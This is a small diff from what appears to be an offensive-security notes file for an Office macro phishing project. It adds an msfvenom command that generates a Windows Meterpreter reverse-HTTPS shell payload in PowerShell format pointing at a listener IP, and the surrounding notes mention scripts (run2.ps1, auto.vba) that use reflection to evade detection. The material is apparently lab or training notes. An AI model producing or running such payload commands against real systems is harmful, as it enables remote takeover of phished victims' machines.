@@ -26,4 +26,5 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EX
 
 run2.ps1 and auto.vba
 Without calling the add-type function and using reflective technique to evade. 
+msfvenom -p windows/meterpreter/reverse_https LHOST=172.22.10.85 LPORT=443 EXITFUNC=thread -f ps1
 ![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/b59c891f-c500-4bd2-9885-ab7af799c861)
